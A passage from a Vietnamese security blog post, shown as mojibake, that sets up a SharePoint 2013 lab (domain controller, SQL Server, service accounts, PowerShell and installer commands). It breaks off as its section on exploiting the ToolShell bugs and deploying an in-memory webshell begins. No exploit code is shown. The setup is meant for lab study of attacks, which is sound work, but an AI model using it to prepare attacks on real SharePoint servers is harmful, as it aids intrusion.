<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Tiáº¿p ná»‘i tá»« series trÆ°á»›c, trong lÃºc mÃ¬nh thá»±c hiá»‡n thá»±c nghiá»‡m cho Ä‘á»“ Ã¡n, mÃ¬nh Ä‘Ã£ nghÄ© Ä‘áº¿n viá»‡c lÃ  lÃ m 2 cÃ¡i lab Ä‘Æ¡n giáº£n Ä‘á»ƒ trigger memshell thÃ´i. NhÆ°ng giáº£ng viÃªn hÆ°á»›ng dáº«n cá»§a mÃ¬nh báº£o lÃ  &ldquo;LÃ m Sharepoint Ä‘i em&rdquo;. So yeah, here we are ğŸ—¿\nI. Setup Guidelines Má»™t sá»‘ link Setup máº«u mÃ¬nh Ä‘Ã£ tham kháº£o:\nhttps://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d https://hackmd.io/@taidh/ByE7_Kqlh Cáº¥u hÃ¬nh mÃ¡y áº£o: DC: WinServer 2012 - 2x2 cores - 4GB RAM SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM DC Set up DNS Server vÃ  promote thÃ nh Domain Controller. 2 mÃ¡y sau sáº½ join domain vÃ  set DNS lÃ  IP cá»§a mÃ¡y DC. Táº¡o OU ServiceAccounts vÃ  thÃªm 3 account:\n"><title>ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized</title><link rel=canonical href=https://kev1n1203.github.io/p/sharepoint-2013/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized"><meta property='og:description' content="Tiáº¿p ná»‘i tá»« series trÆ°á»›c, trong lÃºc mÃ¬nh thá»±c hiá»‡n thá»±c nghiá»‡m cho Ä‘á»“ Ã¡n, mÃ¬nh Ä‘Ã£ nghÄ© Ä‘áº¿n viá»‡c lÃ  lÃ m 2 cÃ¡i lab Ä‘Æ¡n giáº£n Ä‘á»ƒ trigger memshell thÃ´i. NhÆ°ng giáº£ng viÃªn hÆ°á»›ng dáº«n cá»§a mÃ¬nh báº£o lÃ  &ldquo;LÃ m Sharepoint Ä‘i em&rdquo;. So yeah, here we are ğŸ—¿\nI. Setup Guidelines Má»™t sá»‘ link Setup máº«u mÃ¬nh Ä‘Ã£ tham kháº£o:\nhttps://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d https://hackmd.io/@taidh/ByE7_Kqlh Cáº¥u hÃ¬nh mÃ¡y áº£o: DC: WinServer 2012 - 2x2 cores - 4GB RAM SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM DC Set up DNS Server vÃ  promote thÃ nh Domain Controller. 2 mÃ¡y sau sáº½ join domain vÃ  set DNS lÃ  IP cá»§a mÃ¡y DC. Táº¡o OU ServiceAccounts vÃ  thÃªm 3 account:\n"><meta property='og:url' content='https://kev1n1203.github.io/p/sharepoint-2013/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='dotNet'><meta property='article:published_time' content='2026-01-20T00:00:00+00:00'><meta property='article:modified_time' content='2026-01-20T00:00:00+00:00'><meta name=twitter:title content="ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized"><meta name=twitter:description content="Tiáº¿p ná»‘i tá»« series trÆ°á»›c, trong lÃºc mÃ¬nh thá»±c hiá»‡n thá»±c nghiá»‡m cho Ä‘á»“ Ã¡n, mÃ¬nh Ä‘Ã£ nghÄ© Ä‘áº¿n viá»‡c lÃ  lÃ m 2 cÃ¡i lab Ä‘Æ¡n giáº£n Ä‘á»ƒ trigger memshell thÃ´i. NhÆ°ng giáº£ng viÃªn hÆ°á»›ng dáº«n cá»§a mÃ¬nh báº£o lÃ  &ldquo;LÃ m Sharepoint Ä‘i em&rdquo;. So yeah, here we are ğŸ—¿\nI. Setup Guidelines Má»™t sá»‘ link Setup máº«u mÃ¬nh Ä‘Ã£ tham kháº£o:\nhttps://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d https://hackmd.io/@taidh/ByE7_Kqlh Cáº¥u hÃ¬nh mÃ¡y áº£o: DC: WinServer 2012 - 2x2 cores - 4GB RAM SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM DC Set up DNS Server vÃ  promote thÃ nh Domain Controller. 2 mÃ¡y sau sáº½ join domain vÃ  set DNS lÃ  IP cá»§a mÃ¡y DC. Táº¡o OU ServiceAccounts vÃ  thÃªm 3 account:\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung Háº­u - ThÃ nh viÃªn Äƒn háº¡i táº¡i KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#i-setup-guidelines>I. Setup Guidelines</a><ol><li><a href=#cáº¥u-hÃ¬nh-mÃ¡y-áº£o>Cáº¥u hÃ¬nh mÃ¡y áº£o:</a></li><li><a href=#dc>DC</a></li><li><a href=#sql-server>SQL Server</a></li><li><a href=#sharepoint-server>Sharepoint Server</a><ol><li><a href=#lá»—i-set-role-iis>Lá»—i set role IIS</a></li><li><a href=#lá»—i-khi-download-cÃ¡c-package>Lá»—i khi download cÃ¡c package</a></li></ol></li></ol></li><li><a href=#ii-toolshell-in-sharepoint>II. ToolShell in Sharepoint</a><ol><li><a href=#cve-2025-49706-bypass-authentication>[CVE-2025-49706] Bypass Authentication</a></li><li><a href=#cve-2024-38018-webpart-properties-insecure-deserialize>[CVE-2024-38018] WebPart Properties Insecure Deserialize</a></li></ol></li><li><a href=#iii-deploy-memory-webshell>III. Deploy Memory Webshell</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/sharepoint-2013/>ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2026-01-20T00:00:00Z>Jan 20, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>14 minute read</time></div></footer></div></header><section class=article-content><p>Tiáº¿p ná»‘i tá»« series trÆ°á»›c, trong lÃºc mÃ¬nh thá»±c hiá»‡n thá»±c nghiá»‡m cho Ä‘á»“ Ã¡n, mÃ¬nh Ä‘Ã£ nghÄ© Ä‘áº¿n viá»‡c lÃ  lÃ m 2 cÃ¡i lab Ä‘Æ¡n giáº£n Ä‘á»ƒ trigger memshell thÃ´i. NhÆ°ng giáº£ng viÃªn hÆ°á»›ng dáº«n cá»§a mÃ¬nh báº£o lÃ  &ldquo;LÃ m Sharepoint Ä‘i em&rdquo;. So yeah, here we are ğŸ—¿</p><h2 id=i-setup-guidelines>I. Setup Guidelines</h2><p>Má»™t sá»‘ link Setup máº«u mÃ¬nh Ä‘Ã£ tham kháº£o:</p><ul><li><a class=link href=https://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d target=_blank rel=noopener>https://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d</a></li><li><a class=link href=https://hackmd.io/@taidh/ByE7_Kqlh target=_blank rel=noopener>https://hackmd.io/@taidh/ByE7_Kqlh</a></li></ul><h3 id=cáº¥u-hÃ¬nh-mÃ¡y-áº£o>Cáº¥u hÃ¬nh mÃ¡y áº£o:</h3><ul><li>DC: WinServer 2012 - 2x2 cores - 4GB RAM</li><li>SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM</li><li>Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM</li></ul><h3 id=dc>DC</h3><p>Set up DNS Server vÃ  promote thÃ nh Domain Controller. 2 mÃ¡y sau sáº½ join domain vÃ  set DNS lÃ  IP cá»§a mÃ¡y DC.<br><img src=https://hackmd.io/_uploads/SJNrQMhole.png loading=lazy alt=image><br>Táº¡o OU ServiceAccounts vÃ  thÃªm 3 account:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>First name: SharePoint
</span></span><span class=line><span class=cl>Last name: FarmAdmin
</span></span><span class=line><span class=cl>User logon name: sp_farmadmin
</span></span><span class=line><span class=cl>Bá» chá»n â€œUser must change password at next logonâ€
</span></span><span class=line><span class=cl>Chá»n â€œPassword never expiresâ€
</span></span><span class=line><span class=cl>TÆ°Æ¡ng tá»± cho sp_service vÃ  sql_service
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sp_service
</span></span><span class=line><span class=cl>First name: SharePoint
</span></span><span class=line><span class=cl>Last name: Service
</span></span><span class=line><span class=cl>Username: sp_service
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sql_service
</span></span><span class=line><span class=cl>First name: SQL
</span></span><span class=line><span class=cl>Last name: Service
</span></span><span class=line><span class=cl>Username: sql_service
</span></span></code></pre></td></tr></table></div></div><h3 id=sql-server>SQL Server</h3><p>Join Domain vÃ  set DNS.
Táº£i SQL Server Express báº£n Advanced Ä‘á»ƒ cÃ i luÃ´n cáº£ thá»ƒ Management Studio. Link táº£i: <a class=link href="https://www.microsoft.com/en-us/download/details.aspx?id=43351" target=_blank rel=noopener>https://www.microsoft.com/en-us/download/details.aspx?id=43351</a><br>Táº¡i Ä‘Ã¢y chá»n SQLEXPRADV_x64_ENU.exe vÃ  cÃ i Ä‘áº·t nhÆ° bÃ¬nh thÆ°á»ng.<br>LÆ°u Ã½: Äá»ƒ khÃ´ng bá»‹ lá»—i <code>The SQL Server service account login or password is not valid. Use SQL Server Configuration Manager to update the service account.</code> khi set ngÆ°á»i dÃ¹ng DC\sql_service cho SQL Server Database Engine thÃ¬ sá»­ dá»¥ng WinServer 2012 Ä‘á»ƒ set up, dÃ¹ng Win10 sáº½ bá»‹ lá»—i (mÃ¬nh khÃ´ng hiá»ƒu vÃ¬ sao).<br>CÃ²n láº¡i config theo hÆ°á»›ng dáº«n cá»§a anh Jang vÃ  a TÃ iDH</p><h3 id=sharepoint-server>Sharepoint Server</h3><p>Join Domain vÃ  set DNS.<br>Link download file img sharepoint: <a class=link href=https://www.microsoft.com/en-us/evalcenter/download-sharepoint-server-2013 target=_blank rel=noopener>https://www.microsoft.com/en-us/evalcenter/download-sharepoint-server-2013</a> => Chá»n báº£n English<br>WinServer 2012 dÃ­nh ráº¥t nhiá»u lá»—i khi set up SharePoint Server 2013:</p><h4 id=lá»—i-set-role-iis>Lá»—i set role IIS</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>There</span> <span class=n>was</span> <span class=n>an</span> <span class=n>error</span> <span class=n>during</span> <span class=n>Installation</span><span class=p>,</span> <span class=n>The</span> <span class=k>tool</span> <span class=n>was</span> <span class=n>unable</span> <span class=n>to</span> <span class=n>install</span> <span class=n>Application</span> <span class=n>Server</span> <span class=n>Role</span><span class=p>,</span> <span class=n>Web</span> <span class=n>Server</span> <span class=p>(</span><span class=n>IIS</span><span class=p>)</span> <span class=n>Role</span>
</span></span></code></pre></td></tr></table></div></div><p>Link tham kháº£o náº¿u gáº·p:<br><a class=link href=https://www.sharepointdiary.com/2015/05/there-was-an-error-during-installation-the-tool-was-unable-to-install-application-server-role-web-server-iis-role.html target=_blank rel=noopener>https://www.sharepointdiary.com/2015/05/there-was-an-error-during-installation-the-tool-was-unable-to-install-application-server-role-web-server-iis-role.html</a><br><a class=link href=https://vladtalkstech.com/microsoft-365/sharepoint/the-tool-was-unable-to-install-web-server-iis-role-sharepoint-2016-on-windows-server-2016/ target=_blank rel=noopener>https://vladtalkstech.com/microsoft-365/sharepoint/the-tool-was-unable-to-install-web-server-iis-role-sharepoint-2016-on-windows-server-2016/</a></p><ul><li>Tá»± cÃ i Ä‘áº·t cÃ¡c feature báº±ng Powershell:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Add-WindowsFeature NET-WCF-HTTP-Activation45,NET-WCF-TCP-Activation45,NET-WCF-Pipe-Activation45
</span></span><span class=line><span class=cl>Add-WindowsFeature Net-Framework-Features,Web-Server,Web-WebServer,Web-Common-Http,Web-Static-Content,Web-Default-Doc,Web-Dir-Browsing,Web-Http-Errors,Web-App-Dev,Web-Asp-Net,Web-Net-Ext,Web-ISAPI-Ext,Web-ISAPI-Filter,Web-Health,Web-Http-Logging,Web-Log-Libraries,Web-Request-Monitor,Web-Http-Tracing,Web-Security,Web-Basic-Auth,Web-Windows-Auth,Web-Filtering,Web-Digest-Auth,Web-Performance,Web-Stat-Compression,Web-Dyn-Compression,Web-Mgmt-Tools,Web-Mgmt-Console,Web-Mgmt-Compat,Web-Metabase,Application-Server,AS-Web-Support,AS-TCP-Port-Sharing,AS-WAS-Support, AS-HTTP-Activation,AS-TCP-Activation,AS-Named-Pipes,AS-Net-Framework,WAS,WAS-Process-Model,WAS-NET-Environment,WAS-Config-APIs,Web-Lgcy-Scripting,Windows-Identity-Foundation,Server-Media-Foundation,Xps-Viewer
</span></span></code></pre></td></tr></table></div></div><ul><li>Copy file <code>C:\Windows\System32\ServerManager.exe</code> ngay táº¡i folder System32 vÃ  Ä‘á»•i tÃªn thÃ nh <code>ServerManagerCMD.exe</code></li><li>Náº¿u váº«n khÃ´ng Ä‘Æ°á»£c, xem log táº¡i <code>%TEMP%</code> => prerequisiteinstaller.{thá»i gian cÃ i Ä‘áº·t}.log Ä‘á»ƒ Ä‘á»c log sáº½ tháº¥y command run update role nhÆ° sau:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;C:\Windows\system32\ServerManagerCmd.exe&#34; -inputpath &#34;C:\Users\SP_FAR~1\AppData\Local\Temp\PreFEB1.tmp.XML&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&#34;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe&#34; -i
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&#34;C:\Windows\system32\cscript.exe&#34; &#34;C:\Windows\system32\iisext.vbs&#34; /enext &#34;ASP.NET v4.0.30319&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&#34;C:\Windows\system32\iisreset.exe&#34; /noforce
</span></span></code></pre></td></tr></table></div></div><p>CÃ³ thá»ƒ tá»± cháº¡y xong rá»“i restart mÃ¡y cÃ i tiáº¿p (biá»‡n phÃ¡p cuá»‘i cÃ¹ng)<br>LÆ°u Ã½: KhÃ´ng táº¯t ServerManager khi Ä‘ang install. Náº¿u nhÆ° install tháº¥y lÃ¢u chá»©ng tá» Ä‘ang cháº¿t táº¡i bÆ°á»›c set Role nÃ y, nÃ³ Ä‘ang Ä‘á»£i káº¿t quáº£ tráº£ vá»</p><h4 id=lá»—i-khi-download-cÃ¡c-package>Lá»—i khi download cÃ¡c package</h4><p>Khi download cÃ¡c package nhÆ° SQL Server Native Client vÃ  cÃ¡c package sau sáº½ liÃªn tá»¥c dÃ­nh lá»—i vÃ¬ WinServer 2012 Ä‘Ã£ cÅ© vÃ  khÃ´ng thá»±c hiá»‡n káº¿t ná»‘i Ä‘Æ°á»£c site go.microsoft.com (WinServer 2012 cÃ³ váº¥n Ä‘á» gÃ¬ Ä‘áº¥y vá»›i TLS1.2)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=p>[</span><span class=n>In</span> <span class=n>HRESULT</span> <span class=n>format</span><span class=p>]</span> <span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>Beginning</span> <span class=n>download</span> <span class=n>of</span> <span class=n>Microsoft</span> <span class=n>Sync</span> <span class=n>Framework</span> <span class=n>Runtime</span> <span class=n>v1</span><span class=o>.</span><span class=mi>0</span> <span class=n>SP1</span> <span class=p>(</span><span class=n>x64</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>go</span><span class=o>.</span><span class=n>microsoft</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>fwlink</span><span class=o>/</span><span class=err>?</span><span class=n>LinkID</span><span class=o>=</span><span class=mi>224449</span>
</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>Error</span><span class=p>:</span> <span class=n>InternetOpenUrl</span> <span class=n>failed</span> <span class=p>(</span><span class=mh>0X80072F07</span><span class=o>=-</span><span class=mi>2147012857</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>go</span><span class=o>.</span><span class=n>microsoft</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>fwlink</span><span class=o>/</span><span class=err>?</span><span class=n>LinkID</span><span class=o>=</span><span class=mi>224449</span>
</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>Error</span><span class=p>:</span> <span class=n>Download</span> <span class=n>failed</span> <span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>Last</span> <span class=k>return</span> <span class=n>code</span> <span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Äáº¿n Ä‘oáº¡n nÃ y thÃ¬ khi gáº·p lá»—i á»Ÿ Ä‘Ã¢u mÃ¬nh sáº½ copy link download fail táº¡i file log vÃ  táº£i á»Ÿ ngoÃ i, sau Ä‘Ã³ tá»± cÃ i cÃ¡c package vÃ o.<br>ÄÃ¢y lÃ  cÃ¡c package mÃ¬nh Ä‘Ã£ táº£i:<br><img src=https://hackmd.io/_uploads/HJvyZG3ogl.png loading=lazy alt=image><br>CÃ¡c file msi thÃ¬ cÃ³ thá»ƒ cháº¡y ngay, sau Ä‘Ã³ restart mÃ¡y cÃ i tiáº¿p.
CÃ²n má»™t sá»‘ file exe nÃªn cháº¡y command, cÃ i Ä‘áº·t giao diá»‡n xong Sharepoint váº«n sáº½ bÃ¡o lÃ  download error (khÃ´ng hiá»ƒu kiá»ƒu gÃ¬):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>WindowsServerAppFabricSetup_x64.exe /i CacheClient,CachingService,CacheAdmin /gac
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>WcfDataServices.exe /quiet /norestart
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>AppFabric1.1-KB2671763-x64-ENU.exe /quiet /norestart
</span></span></code></pre></td></tr></table></div></div><p>Sau khi cÃ i Ä‘áº·t sau Ä‘á»u nÃªn restart rá»“i báº­t lÃªn cÃ i tiáº¿p, cho Ä‘áº¿n khi hiá»‡n quÃ¡ trÃ¬nh cÃ i Ä‘áº·t hoÃ n táº¥t thÃ¬ tiáº¿p tá»¥c cháº¡y setup.exe vÃ  lÃ m theo cÃ¡c bÆ°á»›c set up Sharepoint:<br><img src=https://hackmd.io/_uploads/H1bdZzhjxl.png loading=lazy alt=image><br>Cáº¥u hÃ¬nh Sharepoint theo máº·c Ä‘á»‹nh. Táº¡i bÆ°á»›c Database server nháº­p ip cá»§a mÃ¡y SQL Server lÃ  10.10.1.137 vÃ  ngÆ°á»i dÃ¹ng káº¿t ná»‘i lÃ  sp_service. Sau khi cáº¥u hÃ¬nh xong, truy cáº­p tá»›i Ä‘Æ°á»ng dáº«n http://sp-server:16504/ Ä‘á»ƒ xÃ¡c nháº­n Ä‘Ã£ cáº¥u hÃ¬nh Central Admin thÃ nh cÃ´ng:<br><img src=https://hackmd.io/_uploads/rkGND9yB-g.png loading=lazy alt=image><br>Tiáº¿p tá»¥c táº¡o site test collection:<br><img src=https://hackmd.io/_uploads/Skme_qJrbx.png loading=lazy alt=image><br></p><h2 id=ii-toolshell-in-sharepoint>II. ToolShell in Sharepoint</h2><p>Do láº§n Ä‘áº§u vá»c Sharepoint, mÃ¬nh Ä‘Ã£ Ä‘i tÃ¬m má»™t CVE cÃ³ poc sáºµn Ä‘á»ƒ thá»±c hiá»‡n khai thÃ¡c, sau Ä‘Ã³ mÃ¬nh chá»n bug ToolShell vÃ¬ nÃ³ cÃ³ áº£nh hÆ°á»Ÿng Ä‘áº¿n táº¥t cáº£ version cá»§a Sharepoint 2013. Bug nÃ y trigger chá»‰ báº±ng 1 request, gá»“m 